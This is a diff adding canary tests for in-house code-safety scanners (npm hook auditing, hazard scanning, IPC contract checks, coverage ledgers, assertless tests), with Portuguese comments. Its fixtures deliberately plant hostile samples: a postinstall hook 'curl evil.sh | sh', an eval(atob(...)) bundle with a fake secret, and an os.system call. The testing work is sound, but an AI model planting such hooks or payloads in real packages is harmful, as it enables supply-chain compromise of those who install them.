@@ -339,6 +339,7 @@ def run_all_metric_canaries() -> tuple[int, int, list[str]]:
         from scripts.metricas.hazard_scan import scan_path
         from scripts.metricas.coverage_ledger import init_ledger, verify_ledger
         from scripts.metricas.contract_closure import check_contract_closure
+        from scripts.metricas.assertless_scan import scan_polyglot  # noqa: F401 — ponte contratual W4
 
         haz_bad = t / "haz_bad.py"
         fake_sk = "sk-proj-" + ("A9b8C7d6E5f4G3h2J1k0" * 2)
@@ -752,6 +753,203 @@ def run_all_metric_canaries() -> tuple[int, int, list[str]]:
                 break
         expect("Canário M63: pergunta destrutiva em 1a pessoa -> ANALISAR com requires_human_auth",
                m63_ok, m63_detail)
+
+        # ============ WAVE 4 — Consenso Adversarial (spec wave4-consenso-adversarial.md) ============
+
+        # M64: metaconfig_diff flagra mutação em package.json.scripts não autorizada;
+        # arquivo declarado na spec passa. Requer mini-repo git temporário.
+        try:
+            from scripts.metricas.metaconfig_diff import check_metaconfig
+        except ImportError:
+            check_metaconfig = None
+        mc_dir = t / "m64_repo"
+        mc_dir.mkdir()
+        subprocess.run(["git", "init", "-q"], cwd=str(mc_dir), check=True)
+        subprocess.run(["git", "-c", "user.email=c@c", "-c", "user.name=c", "commit",
+                        "--allow-empty", "-qm", "base"], cwd=str(mc_dir), check=True)
+        pkg_base = {"name": "x", "scripts": {"test": "vitest"}, "dependencies": {"a": "1.0.0"}}
+        (mc_dir / "package.json").write_text(json.dumps(pkg_base, indent=2), encoding="utf-8")
+        subprocess.run(["git", "add", "package.json"], cwd=str(mc_dir), check=True)
+        subprocess.run(["git", "-c", "user.email=c@c", "-c", "user.name=c", "commit",
+                        "-qm", "pkg"], cwd=str(mc_dir), check=True)
+        # bilateral limpo: sem diff -> exit 0
+        if check_metaconfig is None:
+            muts_clean, auth_clean = ["MISSING-MODULE"], True
+            muts_dirty, auth_dirty = ["MISSING-MODULE"], False
+            muts_auth, auth_req = ["MISSING-MODULE"], True
+        else:
+            muts_clean, auth_clean = check_metaconfig(mc_dir, "HEAD", None)
+            # mutação suja: injeta postinstall
+            pkg_dirty = json.loads(json.dumps(pkg_base))
+            pkg_dirty["scripts"]["postinstall"] = "curl evil.sh | sh"
+            (mc_dir / "package.json").write_text(json.dumps(pkg_dirty, indent=2), encoding="utf-8")
+            muts_dirty, auth_dirty = check_metaconfig(mc_dir, "HEAD", None)
+            # spec autorizando o arquivo -> aprovado
+            spec_mc = mc_dir / "spec.md"
+            spec_mc.write_text("# S\n\n## 4. Escopo Declarado\n\n- `package.json`\n", encoding="utf-8")
+            muts_auth, auth_req = check_metaconfig(mc_dir, "HEAD", spec_mc)
+        code_mc, out_mc = run(MET / "metaconfig_diff.py", "--repo", mc_dir, "--against", "HEAD", "--json")
+        expect("Canário M64: metaconfig_diff reprova mutação de scripts/dependencies não autorizada e exige auth",
+               muts_clean == [] and auth_clean is False
+               and any("package.json" in m for m in muts_dirty) and auth_dirty is True
+               and code_mc == 1 and "METACONFIG-MUTATION" in out_mc and "requires_human_auth" in out_mc
+               and muts_auth == [] and auth_req is False)
+
+        # M65: audit_ledger resolve grafo de hooks npm (pretest->test->posttest)
+        # e reprova comando proibido escondido no posttest
+        try:
+            from scripts.audit_ledger import resolve_npm_lifecycle
+        except ImportError:
+            resolve_npm_lifecycle = None
+        from scripts.audit_ledger import audit_ledger_content
+        pkg_hook = {"scripts": {"pretest": "npm run lint", "test": "vitest run",
+                                "posttest": "npm publish --dry-run", "prelint": "echo pre",
+                                "lint": "eslint .", "postlint": "echo post"}}
+        chain = resolve_npm_lifecycle("npm test", pkg_hook) if resolve_npm_lifecycle else []
+        hook_names = [h for h, _ in chain]
+        led_dir = t / "m65"
+        led_dir.mkdir()
+        (led_dir / "package.json").write_text(json.dumps(pkg_hook), encoding="utf-8")
+        try:
+            led_ok, errs_hook, _ = audit_ledger_content(
+                [{"cmd": "npm test", "exit": 0, "testes_descobertos": 3}],
+                allow_zero_tests=False, pkg=pkg_hook)
+            # grafo limpo aprova
+            pkg_clean_hook = {"scripts": {"test": "vitest run", "posttest": "echo done"}}
+            led_ok2, errs_hook2, _ = audit_ledger_content(
+                [{"cmd": "npm test", "exit": 0, "testes_descobertos": 3}],
+                allow_zero_tests=False, pkg=pkg_clean_hook)
+        except TypeError:
+            led_ok, errs_hook, led_ok2 = True, [], False
+        expect("Canário M65: audit_ledger resolve lifecycle npm transitivamente e reprova publish no posttest",
+               hook_names[:1] == ["pretest"] and hook_names[-2:] == ["test", "posttest"]
+               and "lint" in hook_names
+               and not led_ok and any("posttest" in e for e in errs_hook)
+               and led_ok2)
+
+        # M66: hazard_scan --dist re-escaneia bundle minificado (segredos/endpoints/sinks)
+        dist_dir = t / "m66_dist"
+        dist_dir.mkdir()
+        (dist_dir / "app.min.js").write_text(
+            "const _0x1={k:'sk-live-abcdef1234567890abcdef1234567890'};eval(atob('YWxlcnQoMSk='));"
+            "fetch('https://user:senha123@api.ex.com/x')\n", encoding="utf-8")
+        code_dist, out_dist = run(MET / "hazard_scan.py", "--dist", dist_dir)
+        expect("Canário M66: hazard_scan --dist flagra segredo/url-cred/eval em bundle minificado",
+               code_dist == 1 and "HARDCODED-SECRET" in out_dist)
+
+        # M67: contract_closure v2 — literal morta não fecha ponte; canal computado e
+        # dispatch cego são reprovados; ações ausentes quebram a ponte
+        cc_dir = t / "m67"
+        (cc_dir / "src").mkdir(parents=True)
+        (cc_dir / "docs/designs").mkdir(parents=True)
+        (cc_dir / "src/main.ts").write_text(
+            'const X = "APP_STATE_SYNC";\n'
+            'ipcMain.handle(atob("QVBQ"), (e, cmd) => handlers[cmd](e));\n', encoding="utf-8")
+        (cc_dir / "src/preload.ts").write_text(
+            'export const api = { invoke: (c) => ipcRenderer.invoke("APP_STATE_SYNC", c) };\n',
+            encoding="utf-8")
+        spec_cc = cc_dir / "docs/designs/s.md"
+        spec_cc.write_text(
+            "# S\n\n## 4. Escopo Declarado\n\n- `src/main.ts`\n- `src/preload.ts`\n\n"
+            "## 5. Pontes de Contrato\n\n"
+            '- ponte: src/main.ts::"APP_STATE_SYNC" -> src/preload.ts [ações: "sync:get"]\n',
+            encoding="utf-8")
+        ok_cc, errs_cc = check_contract_closure(spec_cc, cc_dir)
+        # caminho limpo: callsite literal + ação presente + switch com default
+        (cc_dir / "src/main.ts").write_text(
+            'ipcMain.handle("APP_STATE_SYNC", (e, cmd) => {\n'
+            '  switch (cmd) { case "sync:get": return get(e); default: throw new Error("deny") }\n'
+            '});\n', encoding="utf-8")
+        (cc_dir / "src/preload.ts").write_text(
+            'export const api = { get: () => ipcRenderer.invoke("APP_STATE_SYNC", "sync:get") };\n',
+            encoding="utf-8")
+        ok_cc2, errs_cc2 = check_contract_closure(spec_cc, cc_dir)
+        expect("Canário M67: contract_closure v2 reprova literal morta/canal computado/dispatch cego e ação ausente",
+               not ok_cc and any("CHANNEL-LITERAL-DEAD" in e or "COMPUTED-CHANNEL" in e for e in errs_cc)
+               and any("BROKEN-BRIDGE-ACTION" in e or "HIDDEN-DISPATCH" in e or "NO-DEFAULT-DENY" in e
+                       for e in errs_cc)
+               and ok_cc2, "; ".join(errs_cc)[:140])
+
+        # M68: hazard_scan — FRAME-INTROSPECTION + DYNAMIC-DISPATCH-IPC
+        fi_dir = t / "m68"
+        fi_dir.mkdir()
+        (fi_dir / "spy.py").write_text("import sys\nsys._getframe(1).f_globals['x'] = 1\n", encoding="utf-8")
+        (fi_dir / "ipc.ts").write_text(
+            "ipcMain.handle('APP_CH', (evt, cmd) => { return handlers[cmd](evt); });\n",
+            encoding="utf-8")
+        _, fnds_fi, _ = scan_path(fi_dir)
+        rules_fi = {r for r, _, _, _ in fnds_fi}
+        expect("Canário M68: hazard_scan flagra FRAME-INTROSPECTION e DYNAMIC-DISPATCH-IPC",
+               "FRAME-INTROSPECTION" in rules_fi and "DYNAMIC-DISPATCH-IPC" in rules_fi,
+               str(rules_fi))
+
+        # M69: coverage_ledger — teto OOS por diretório + NEW-FILE-OUT-OF-SCOPE
+        cl_dir = t / "m69"
+        (cl_dir / "core").mkdir(parents=True)
+        (cl_dir / "ui").mkdir(parents=True)
+        for i in range(4):
+            (cl_dir / "core" / f"c{i}.py").write_text(f"x={i}\n", encoding="utf-8")
+        for i in range(12):
+            (cl_dir / "ui" / f"u{i}.py").write_text(f"y={i}\n", encoding="utf-8")
+        led_m69 = t / "m69_ledger.json"
+        code_init, _ = run(MET / "coverage_ledger.py", "init", "--root", cl_dir, "--out", led_m69)
+        led_d = json.loads(led_m69.read_text(encoding="utf-8"))
+        # OOS global = 4/16 = 25%? para isolar: OOS total deve ficar <= 20% → uso 3 OOS em core
+        # (3/16 = 18.75% < 20% global, mas core/ = 3/4 = 75% > 20% por-dir)
+        oos_files = {"core/c0.py", "core/c1.py", "core/c2.py"}
+        for u in led_d["units"]:
+            rel = u["path"].replace("\\", "/")
+            if rel in oos_files:
+                u["status"] = "out_of_scope"; u["reason"] = "diluicao proposital"
+            else:
+                u["status"] = "covered"
+                u["checks"] = [{"agent_id": "devin", "invariant": "x", "result": "pass"}]
+        led_m69.write_text(json.dumps(led_d), encoding="utf-8")
+        code_dil, out_dil = run(MET / "coverage_ledger.py", "verify", led_m69,
+                                "--min-pct", "10", "--max-out-of-scope-pct", "50")
+        # NEW-FILE-OOS: repo git onde arquivo novo da PR vira out_of_scope
+        nf_dir = t / "m69_nf"
+        nf_dir.mkdir()
+        subprocess.run(["git", "init", "-q"], cwd=str(nf_dir), check=True)
+        (nf_dir / "old.py").write_text("x=1\n", encoding="utf-8")
+        subprocess.run(["git", "add", "."], cwd=str(nf_dir), check=True)
+        subprocess.run(["git", "-c", "user.email=c@c", "-c", "user.name=c", "commit",
+                        "-qm", "base"], cwd=str(nf_dir), check=True)
+        (nf_dir / "new_danger.py").write_text("import os\nos.system('id')\n", encoding="utf-8")
+        subprocess.run(["git", "add", "new_danger.py"], cwd=str(nf_dir), check=True)
+        led_nf = t / "m69_nf.json"
+        run(MET / "coverage_ledger.py", "init", "--root", nf_dir, "--out", led_nf)
+        nf_d = json.loads(led_nf.read_text(encoding="utf-8"))
+        for u in nf_d["units"]:
+            if u["path"].endswith("new_danger.py"):
+                u["status"] = "out_of_scope"; u["reason"] = "nasceu perigoso"
+            else:
+                u["status"] = "covered"
+                u["checks"] = [{"agent_id": "devin", "invariant": "x", "result": "pass"}]
+        led_nf.write_text(json.dumps(nf_d), encoding="utf-8")
+        code_nf, out_nf = run(MET / "coverage_ledger.py", "verify", led_nf,
+                              "--min-pct", "0", "--max-out-of-scope-pct", "60", "--against", "HEAD")
+        expect("Canário M69: coverage_ledger reprova diluição por diretório e OOS em arquivo novo da PR",
+               code_dil == 1 and "DILUTED-OUT-OF-SCOPE" in out_dil
+               and code_nf == 1 and "NEW-FILE-OUT-OF-SCOPE" in out_nf,
+               f"dil={out_dil.strip()[:80]} | nf={out_nf.strip()[:80]}")
+
+        # M70: assertless_scan — hit-and-swallow (catch vazio, .catch(() => {}), except pass)
+        sw_dir = t / "m70"
+        sw_dir.mkdir()
+        (sw_dir / "sw.test.ts").write_text(
+            "it('deve falhar', async () => {\n"
+            "  try { await risky(); } catch (e) {}\n"
+            "  risky2().catch(() => {});\n"
+            "});\n", encoding="utf-8")
+        (sw_dir / "sw2.test.py").write_text(
+            "def test_x():\n    try:\n        risky()\n    except Exception:\n        pass\n", encoding="utf-8")
+        (sw_dir / "ok.test.ts").write_text(
+            "it('ok', async () => { try { await f(); } catch (e) { expect(e).toBeDefined(); } });\n",
+            encoding="utf-8")
+        code_sw, out_sw = run(MET / "assertless_scan.py", sw_dir)
+        expect("Canário M70: assertless_scan reprova hit-and-swallow e aprova catch com asserção",
+               code_sw == 1 and "HIT-AND-SWALLOW" in out_sw, out_sw.strip()[:100])
 
     return passed, total, reports
 
